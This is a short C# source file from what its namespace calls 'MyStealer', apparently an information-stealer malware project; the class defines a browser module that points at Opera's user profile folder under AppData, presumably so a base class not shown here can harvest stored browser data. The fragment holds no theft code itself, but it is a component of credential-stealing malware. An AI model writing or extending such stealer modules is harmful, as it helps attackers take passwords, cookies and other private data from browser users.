using System.IO;
using System;

namespace MyStealer.Modules.Browser.ChromiumBased
{
    internal class OperaStable : Chromium
    {
        public override string ApplicationName => "Opera (stable)";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable");
    }
}
